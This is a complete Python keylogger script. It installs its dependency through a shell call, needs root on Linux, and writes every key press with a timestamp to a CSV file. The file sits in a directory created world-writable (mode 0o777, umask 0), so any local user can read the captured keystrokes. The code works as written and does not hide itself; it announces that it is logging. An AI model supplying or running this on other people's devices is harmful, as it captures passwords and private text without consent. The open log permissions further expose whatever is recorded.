#!/usr/bin/python3

import datetime
import sys
import os

# Requires sudo on linux

# Test that the required dependency is installed
try:
    import keyboard
except ModuleNotFoundError:
    try:
        os.system("pip3 -qqq install keyboard")
        import keyboard
    except:
        print("The keyboard module is not installed and could not be installed automatically.")
        print("Install it with `pip3 install keyboard`")
        print("or if that doesn't work, `sudo pip3 install keyboard`")
        sys.exit()

# Test that the keyboard can be read from
try:   
    keyboard.hook(None)
    keyboard.unhook_all()
except:
    print("Make sure the program is running as sudo on Linux")
    sys.exit()

# Create Logs directory if it doesn't exist
if not os.path.exists("keylogs"):
    os.umask(0)
    os.makedirs("keylogs", 0o777)

# Create log csv and write the header comment
logFile = open(os.path.join("keylogs", datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S") + "-keylog.csv"), "w")
logFile.write("#Timestamp,Keyboard Event [NEWLINE]\n")

print("Logging all keyboard activity on device")

#Log keys
while True:
    try:
        event = keyboard.read_key()
        logFile.write(str(datetime.datetime.now()) + "," + event + "\n")
    except KeyboardInterrupt:
        print("\nThanks for keylogging!")
        sys.exit()